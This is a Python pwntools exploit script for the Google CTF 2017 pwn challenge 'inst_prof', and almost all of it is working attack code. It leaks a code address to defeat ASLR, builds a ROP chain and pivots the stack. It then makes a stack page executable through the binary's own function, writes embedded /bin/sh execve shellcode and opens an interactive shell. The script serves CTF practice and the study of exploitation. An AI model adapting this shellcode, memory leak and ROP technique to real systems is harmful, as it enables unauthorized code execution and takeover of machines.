#
# Google CTF 2017 pwn inst_prof
#
# Based on
# * https://develbranch.com

from pwn import *
import sys

b = ELF('./inst_prof')

context.arch = b.arch
context.log_level = 'info'

r = process('./inst_prof')

def assemble(code):
    encoding = asm(code)
    if len(encoding) > 4:
        raise Exception("TOO LONG! code=%s, len=%d" % (code, len(encoding)))
    while len(encoding) < 4:
        encoding += '\xc3'
    return encoding

def movb_r15(n):
    if n <= 0x7f:
        return assemble('push %d; pop r15' % n)
    else:
        return assemble('xor r15, r15') + assemble('inc r15') * n

#
# stack based programming
#
def store_r15(stack_off):
    return assemble('push rsp; pop r14') + assemble('inc r14') * stack_off + assemble('mov [r14], r15')

def load_to_r15(stack_off):
    return assemble('push rsp; pop r14') + assemble('inc r14') * stack_off + assemble('mov r15, [r14]')

def mov_r15_retaddr():
    return assemble('mov r15,[rsp]')

def write_string(stack_off, s):
    encoding = ''
    for c in s:
        encoding += movb_r15(ord(c))
        encoding += store_r15(stack_off)
        stack_off += 1
    return encoding

def s(asm):
    r.send(assemble(asm))

# add rsp,0x1000 -> push rsp into 'rw-' region
adjust_stack = "\x48\x81\xC4\x00\x10\x00\x00" 

# Execute /bin/sh - 27 bytes : http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" 

def recv_all():
    b = ""
    last_recv = True
    while last_recv:
        try:
            last_recv = r.recv(1024)
        except socket.timeout:
            last_recv = None
        if last_recv:
            b += last_recv
    return b

if __name__ == "__main__":

    r.recvuntil('ready')

    r.settimeout(0.5)

    offset = 56
    pop_rdi = 0xbc3 # pop rdi; ret
    pop_rsi = 0xbc1 # pop rsi; pop r15; ret

    s('mov r14,[rsp]')
    print r.recvn(8)

    buf = assemble('dec r14; ret') * (0xb18 - 0x8a2) 
    r.send(buf)
    recv_all()

    s('push rsp; pop rsi; push r14')

    d = recv_all()
    l = d[len(d)-6:len(d)] + '\x00\x00'
    l = u64(l)

    CODE_BASE = l - 0x8a2
    log.info("CODE_BASE: 0x%x" % CODE_BASE)

    op = ''
    op += p64(CODE_BASE + pop_rdi)
    op += p64(0)
    op += p64(CODE_BASE + b.plt['alarm'])
    op += p64(CODE_BASE + 0x8c7)

    s('push rsp; pop r14; ret')
    r.send(asm('inc r14;ret') * offset)
    for x in op:
        buf = asm('movb [r14], %#x' % ord(x))
        buf += asm('inc r14; ret')
        r.send(buf)
    s('pop rax; pop rdx; push rax; ret')            # stack pivot

    op = ''
    op += mov_r15_retaddr()
    op += assemble('inc r15') * (0xbc3 - 0xb18)     # 0xbc3: pop rdi;ret
    op += store_r15(offset) 
    op += assemble('mov r14, rcx') # rcx is 0x1000
    op += assemble('push rsp; pop r15')
    op += assemble('dec r14') # r14 ix 0xfff
    op += assemble('not r14') # r14 is 1111...1000
    op += assemble('and r15, r14') # rsp & 1111...1000
    op += store_r15(offset + 0x8)
    
    op += mov_r15_retaddr()
    op += assemble('dec r15') * (0xb18 - 0xa20)     # make_page_executable() -> r-x
    op += store_r15(offset + 0x10)
    
    op += assemble('push rsp; pop r15')
    op += assemble('inc r15') * (offset + 0x70)
    op += store_r15(offset + 0x18)

    op += write_string(offset + 0x70, adjust_stack + shellcode)

    op += movb_r15(offset)
    op += assemble('add rsp, r15')                  # stack pivot
    
    r.send(op)
    r.interactive()
